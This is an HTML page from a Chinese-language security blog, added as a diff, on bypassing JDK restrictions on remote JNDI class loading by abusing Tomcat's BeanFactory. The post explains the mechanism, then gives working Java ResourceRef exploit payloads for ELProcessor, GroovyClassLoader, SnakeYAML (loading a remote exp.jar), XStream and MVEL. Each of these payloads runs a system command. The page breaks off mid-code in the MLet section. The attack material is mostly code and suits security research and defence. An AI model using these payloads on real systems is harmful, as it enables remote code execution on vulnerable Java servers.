@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="springtime">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="概述限制以下JDK版本之后出现了针对trustURLCodebase的限制，即默认不允许加载远程ObjectFactory：  RMI：6u132, 7u122, 8u113 LDAP：11.0.1, 8u191, 7u201, 6u211  绕过思路绕过思路主要就是触发JDNI注入的过程中会触发受害机ObjectFactory实现类的getObjectInstance()方法，既然高版本不适用加">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI Attack 高版本bypass">
+<meta property="og:url" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/index.html">
+<meta property="og:site_name" content="spring&#39;s blog">
+<meta property="og:description" content="概述限制以下JDK版本之后出现了针对trustURLCodebase的限制，即默认不允许加载远程ObjectFactory：  RMI：6u132, 7u122, 8u113 LDAP：11.0.1, 8u191, 7u201, 6u211  绕过思路绕过思路主要就是触发JDNI注入的过程中会触发受害机ObjectFactory实现类的getObjectInstance()方法，既然高版本不适用加">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706100607955.png">
+<meta property="og:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706100903221.png">
+<meta property="og:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706102127965.png">
+<meta property="og:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706102259825.png">
+<meta property="og:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827114744484.png">
+<meta property="og:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827155857948.png">
+<meta property="og:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827160143774.png">
+<meta property="article:published_time" content="2023-06-03T02:59:58.000Z">
+<meta property="article:modified_time" content="2023-08-27T13:23:36.424Z">
+<meta property="article:author" content="springtime">
+<meta property="article:tag" content="JNDI">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706100607955.png">
+  
+  
+  
+  <title>JNDI Attack 高版本bypass - spring&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>springtime</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JNDI Attack 高版本bypass"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-03 10:59" pubdate>
+          Saturday, June 3rd 2023, 10:59 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JNDI Attack 高版本bypass</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>以下JDK版本之后出现了针对<code>trustURLCodebase</code>的限制，即默认不允许加载远程ObjectFactory：</p>
+<ul>
+<li>RMI：6u132, 7u122, 8u113</li>
+<li>LDAP：11.0.1, 8u191, 7u201, 6u211</li>
+</ul>
+<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>绕过思路主要就是触发JDNI注入的过程中会触发受害机<code>ObjectFactory</code>实现类的<code>getObjectInstance()</code>方法，既然高版本不适用加载远程<code>ObjectFactory</code>，那么就是用本地<code>ObjectFactory</code>，常用的绕过有：</p>
+<ol>
+<li><strong>基于Tomcat依赖中的<code>BeanFactory</code>。</strong>⭐⭐</li>
+<li><strong>基于Tomcat中的<code>MemoryUserDatabaseFactory</code>。</strong></li>
+<li><strong>基于JDBC-RCE。</strong></li>
+<li><strong>基于反序列化。</strong></li>
+</ol>
+<h1 id="利用BeanFactory"><a href="#利用BeanFactory" class="headerlink" title="利用BeanFactory"></a>利用BeanFactory</h1><p>简单看一下BeanFactory#getObjectInstance()的处理过程，首先获取Reference类名(必须是ResourceRef)并load类，如果上下文中没有ClassLoader就用SystemClassLoader。</p>
+<img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706100607955.png" srcset="/img/loading.gif" lazyload class="" title="image-20230706100607955">
+
+<p>下一步使用java.beans.Introspector对beanclass进行解析，获取bean中的所有属性，然后拿Reference类的forceString，并对其value以<code> ,</code>进行split。</p>
+<img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706100903221.png" srcset="/img/loading.gif" lazyload class="" title="image-20230706100903221">
+
+<p>然后遍历split出来的hashmap，获取其setter方法</p>
+<img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706102127965.png" srcset="/img/loading.gif" lazyload class="" title="image-20230706102127965">
+
+<p>最后直接反射调用setter方法</p>
+<img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706102259825.png" srcset="/img/loading.gif" lazyload class="" title="image-20230706102259825">
+
+<p>处理逻辑其实是：</p>
+<ol>
+<li>取出forceString的值，按照<code>,</code>分割为不同的method，<code>=</code>分割为param与propName。</li>
+<li>将propName作为方法名反射获得一个参数为String.class的方法。</li>
+<li>取出Addrs中param的值，并作为参数赋予propName方法执行。</li>
+</ol>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.example.Demo&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;&lt;param&gt;=&lt;propName&gt;&quot;</span>)); <span class="hljs-comment">//参数 = 方法</span><br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;&lt;param&gt;&quot;</span>, <span class="hljs-string">&quot;paramValue&quot;</span>));<br><span class="hljs-keyword">return</span> ref;<br><span class="hljs-comment">//等同于 new org.example.Demo().propName(&quot;paramValue&quot;)</span><br></code></pre></td></tr></table></figure>
+
+<p>所以总结出来可利用类的要求就是</p>
+<ul>
+<li>类必须在本地依赖或者JDK自带。</li>
+<li>可以调用的是public无参构造方法，并且参数只能有一个String。</li>
+</ul>
+<p>顺着这个思路在常用的依赖中查找，有以下几个可利用的地方：</p>
+<ul>
+<li>javax.el.<strong>ELProcessor</strong>#eval()</li>
+<li>groovy.lang.<strong>GroovyShell</strong>#evaluate() &#x2F; (<strong>GroovyClassLoader</strong>)</li>
+<li>org.yaml.snakeyaml.<strong>Yaml</strong>#load()</li>
+<li>com.thoughtworks.xstream.<strong>XStream</strong>#fromXML()</li>
+<li>org.mvel2**.MVEL**#eval()</li>
+<li>com.sun.glass.utils.<strong>NativeLibLoader</strong>#()</li>
+</ul>
+<h2 id="javax-el-ELProcessor-eval-RCE"><a href="#javax-el-ELProcessor-eval-RCE" class="headerlink" title="javax.el.ELProcessor#eval() [RCE]"></a>javax.el.<strong>ELProcessor</strong>#eval() [RCE]</h2><p>执行EL表达式RCE</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br><br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;]).start()\&quot;)&quot;</span>));<br><span class="hljs-keyword">return</span> ref;<br><br><span class="hljs-comment">//等同于</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">new javax.el.ELProcessor().eval(&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;]).start()\&quot;)&quot;)</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="groovy-lang-GroovyClassLoader-evaluate-RCE"><a href="#groovy-lang-GroovyClassLoader-evaluate-RCE" class="headerlink" title="groovy.lang.GroovyClassLoader#evaluate() [RCE]"></a>groovy.lang.<strong>GroovyClassLoader</strong>#evaluate() [RCE]</h2><p>顾名思义，利用groovy依赖自定义类加载。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;gungnir=parseClass&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef gungnir\n&quot;</span>, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;gungnir&quot;</span>,script));<br><span class="hljs-comment">//等同于</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">new groovy.lang.GroovyClassLoader().parseClass(&quot;<span class="hljs-doctag">@groovy</span>.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef gungnir\n&quot;, &quot;calc.exe&quot;)</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>
+
+<p>当然也可以直接GroovyShell执行。</p>
+<h2 id="org-yaml-snakeyaml-Yaml-load-RCE"><a href="#org-yaml-snakeyaml-Yaml-load-RCE" class="headerlink" title="org.yaml.snakeyaml.Yaml#load() [RCE]"></a>org.yaml.snakeyaml.<strong>Yaml</strong>#load() [RCE]</h2><p>加载解析yaml字符串，实现类方法的调用，例如URLCLassLoader。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>        <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +<br>        <span class="hljs-string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot;</span> +<br>        <span class="hljs-string">&quot;  ]]\n&quot;</span> +<br>        <span class="hljs-string">&quot;]&quot;</span>;<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=load&quot;</span>));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, yaml));<br><span class="hljs-keyword">return</span> ref;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="com-thoughtworks-xstream-XStream-fromXML-RCE"><a href="#com-thoughtworks-xstream-XStream-fromXML-RCE" class="headerlink" title="com.thoughtworks.xstream.XStream#fromXML() [RCE]"></a>com.thoughtworks.xstream.<strong>XStream</strong>#fromXML() [RCE]</h2><p>XML反序列化打本地反序列化链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;com.thoughtworks.xstream.XStream&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &lt;unserializable-parents/&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &lt;java.util.PriorityQueue&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;default&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;size&gt;2&lt;/size&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;/default&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;int&gt;3&lt;/int&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;handler class=&#x27;sun.tracing.NullProvider&#x27;&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;active&gt;true&lt;/active&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;probes&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;          &lt;entry&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;/parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;/method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;proxy class=&#x27;java.lang.Runtime&#x27;/&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;implementing__method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;/parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;/implementing__method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;          &lt;/entry&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;/probes&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;/handler&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &lt;/java.util.PriorityQueue&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;&lt;/java.util.PriorityQueue&gt;&quot;</span>;<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=fromXML&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, xml));<br>    <span class="hljs-keyword">return</span> ref;<br></code></pre></td></tr></table></figure>
+
+<h2 id="org-mvel2-MVEL-eval-RCE"><a href="#org-mvel2-MVEL-eval-RCE" class="headerlink" title="org.mvel2**.MVEL**#eval() [RCE]"></a>org.mvel2**.MVEL**#eval() [RCE]</h2><p>通过 <code>ShellSession.exec(String)</code> 去执行push命令，从而解析MVEL表达式。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.mvel2.sh.ShellSession&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=exec&quot;</span>));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>,<br>        <span class="hljs-string">&quot;push Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;);&quot;</span>));<br><span class="hljs-keyword">return</span> ref;<br></code></pre></td></tr></table></figure>
+
+<h2 id="javax-management-loading-MLet-类探测"><a href="#javax-management-loading-MLet-类探测" class="headerlink" title="javax.management.loading.MLet [类探测]"></a>javax.management.loading.MLet [类探测]</h2><p>只能执行到loadClass()，仅仅加载没有初始化或实例化，因此只能探测类是否存在无法直接RCE。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span 